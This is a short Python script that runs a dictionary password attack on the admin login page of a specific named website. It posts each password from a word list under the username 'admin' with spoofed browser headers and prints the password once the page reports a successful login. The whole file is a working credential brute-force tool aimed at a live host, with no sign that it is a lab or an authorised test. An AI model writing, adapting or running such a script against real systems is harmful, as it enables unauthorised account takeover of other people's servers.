import requests

url = "http://xc.whhzys.cn/admin.php/login/index"
headers = {
    "User-Agent": "Mozilla/5.0(Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "*/*",
    "Accept-Language": "zh-CN, zh;q=0.8, zh-TW;q=0.7, zh-HK;q=0.5, en-US;q=0.3, en;q=0.2",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Content-Length": "42",
    "Origin": "http://xc.whhzys.cn",
    "Connection": "keep-alive",
    "Referer": "http://xc.whhzys.cn/admin.php/login/index",
    "Priority": "u=0",
}

try:
    with open("password.txt", 'r') as f:
        for line in f:
            passwd = line.strip()
            data = f"username=admin&password={passwd}&remember=on"
            try:
                res1 = requests.post(url=url, headers=headers, data=data)
                if res1.status_code == 200 and "登录成功" in res1.text:
                    print(f"登录成功, 密码为{passwd}")
                    break
            except requests.exceptions.RequestException as e:
                print(f"请求错误: {e}")
except FileNotFoundError:
    print("密码文件未找到")